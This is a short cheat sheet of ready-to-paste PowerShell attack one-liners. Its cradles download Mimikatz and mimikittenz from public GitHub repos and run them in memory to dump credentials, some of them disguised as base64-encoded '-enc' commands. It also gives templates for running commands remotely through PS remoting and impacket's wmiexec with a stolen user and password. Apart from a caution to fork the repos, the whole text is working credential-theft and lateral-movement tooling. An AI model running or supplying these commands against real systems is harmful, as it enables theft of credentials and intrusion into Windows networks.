*NOTE - These pull from public GitHub Repos that are not under my control. Make sure you trust the content (or better yet, make your own fork) prior to using!*

#mimikatz [local]
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;

#encoded-mimikatz [local]
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQgBDAC0AUwBFAEMAVQBSAEkAVABZAC8ARQBtAHAAaQByAGUALwBtAGEAcwB0AGUAcgAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBDAG8AbQBtAGEAbgBkACAAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA

#ps remoting [remote]
Invoke-Command -ComputerName <IP-Address> -ScriptBlock {powershell etc...}

#impacket's wmiexec.py [remote]
wmiexec.py <USER:PASSWORD@IP-Address> "powershell -enc powershell etc..."

#mimikittenz [local]
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz

#encoded-mimikittenz [local]
powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==